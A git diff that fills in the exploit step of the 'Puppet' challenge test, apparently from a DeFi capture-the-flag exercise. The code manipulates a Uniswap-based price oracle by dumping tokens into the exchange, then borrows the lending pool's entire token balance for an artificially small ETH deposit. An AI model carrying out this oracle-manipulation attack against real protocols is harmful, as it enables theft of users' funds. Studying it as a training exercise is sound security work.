@@ -103,6 +103,34 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /* 
+            Vulnerability: 
+            The lendingPool relies on the uniswapExchange for eth-token exchange prices. The
+            attacker floods the exchange with tokens which will cause the pool's 
+            _computeOraclePrice function to return a much lower required deposit amount. The
+            attacker then borrows all of the tokens from the lending pool. 
+        */
+
+        // Flood the exchange with tokens
+        const attackerTokenBalance = await this.token.balanceOf(attacker.address)
+        await this.token
+            .connect(attacker)
+            .approve(this.uniswapExchange.address, attackerTokenBalance)
+
+        await this.uniswapExchange
+            .connect(attacker)
+            .tokenToEthSwapInput(
+                attackerTokenBalance.sub(1),
+                1,
+                (await ethers.provider.getBlock('latest')).timestamp * 2
+            )
+
+        // Get the amount of eth required to purchase all the tokens in the pool
+        const poolTokenBalance = await this.token.balanceOf(this.lendingPool.address)
+        const ethRequired = await this.lendingPool.calculateDepositRequired(poolTokenBalance)
+
+        // Purchase all the tokens in the pool at an artificially low price
+        await this.lendingPool.connect(attacker).borrow(poolTokenBalance, { value: ethRequired })
     });
 
     after(async function () {
